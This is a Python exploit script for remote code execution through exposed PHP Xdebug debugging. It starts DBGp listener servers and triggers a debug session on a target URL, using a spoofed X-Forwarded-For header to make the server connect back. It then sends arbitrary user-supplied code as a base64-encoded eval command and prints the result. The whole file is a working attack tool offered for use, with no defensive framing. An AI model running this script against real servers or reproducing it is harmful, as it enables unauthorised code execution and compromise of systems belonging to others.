#!/usr/bin/env python3
import re
import sys
import time
import requests
import argparse
import socket
import base64
import binascii
import socketserver
import threading
import logging

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(levelname)s - %(message)s')
server_done = threading.Event()
server_started = threading.Event()


def recv_xml(sock: socket.socket) -> bytes:
    blocks = []
    data = b''
    while True:
        try:
            data = data + sock.recv(1024)
        except socket.error as e:
            break
        if not data:
            break

        while data:
            eop = data.find(b'\x00')
            if eop < 0:
                break
            blocks.append(data[:eop])
            data = data[eop+1:]

        if len(blocks) >= 4:
            break
    
    return blocks[3]


class XDebugRequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        logging.info('[+] Recieve data from %s', self.client_address)
        self.request.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(self.server.code.encode()), b'\x00']))
        data = recv_xml(self.request)
        logging.info('[+] Recieve data: ' + data.decode())
        g = re.search(rb'<\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>', data, re.I)
        if not g:
            logging.warning('[-] No result...')
            return
        
        data = g.group(1)
        try:
            logging.info('[+] Result: ' + base64.b64decode(data).decode())
            server_done.set()
        except binascii.Error as e:
            logging.error('[-] May be not string result: %s', e)


class XDebugServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def __init__(self, server_address, handler_class, code):
        self.code = code
        self.allow_reuse_address = True
        super().__init__(server_address, handler_class)

    def server_activate(self):
        super().server_activate()
        logging.info('[+] Server %s started', self.server_address)
        server_started.set()


def start_dbgp_server(port: int, code: str):
    server = XDebugServer(('0.0.0.0', port), XDebugRequestHandler, code)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    
    return server_thread


def trigger_debug_session(url: str, attack_ip: str):
    try:
        server_started.wait(timeout=5)
        logging.info('[+] Trigger debug session')
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0'
        }
        if attack_ip:
            headers['X-Forwarded-For'] = attack_ip

        requests.get(url + '?XDEBUG_SESSION_START=phpstorm&XDEBUG_SESSION=1&XDEBUG_TRIGGER=1', headers=headers, timeout=5)
    except:
        pass


def main():
    parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')
    parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')
    parser.add_argument('-t', '--target', required=True, help='target url.')
    parser.add_argument('--dbgp-ip', default='', help='dbgp server ip address, must can be accessed from target server.')
    args = parser.parse_args()

    start_dbgp_server(9000, args.code)
    start_dbgp_server(9003, args.code)
    threading.Thread(target=trigger_debug_session, args=(args.target, args.dbgp_ip), daemon=True).start()
    try:
        # Wait with a timeout, but check for interrupts
        for i in range(20):
            if server_done.is_set():
                break
            time.sleep(0.5)
        else:
            logging.error('[-] Execution timed out')            
    except KeyboardInterrupt:
        logging.info('[*] Received keyboard interrupt, exiting...')


if __name__ == '__main__':
    main()
